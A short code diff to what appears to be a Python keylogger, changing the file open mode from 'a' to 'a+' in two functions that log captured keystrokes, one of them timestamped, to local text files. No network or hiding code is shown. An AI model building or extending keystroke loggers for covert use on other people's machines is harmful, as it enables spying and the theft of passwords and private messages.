@@ -29,7 +29,7 @@ def timestamp():
 def write_to_file_raw(key):
     path = 'keylog_raw.txt'
 
-    with open(path, 'a') as lines:
+    with open(path, 'a+') as lines:
         key = str(key).strip('\'')
 
         # adds 'Key.esc' to the end of '[ ESC ]' for some reason
@@ -47,7 +47,7 @@ def write_to_file_raw(key):
 def write_to_file_verbose(time, key_input):
     path = 'keylog_timestamped.txt'
 
-    with open(path, 'a') as lines:
+    with open(path, 'a+') as lines:
         lines.write(str(timestamp()) + ': ')
         lines.write(key_input + ' key was pressed' + '\n')
 
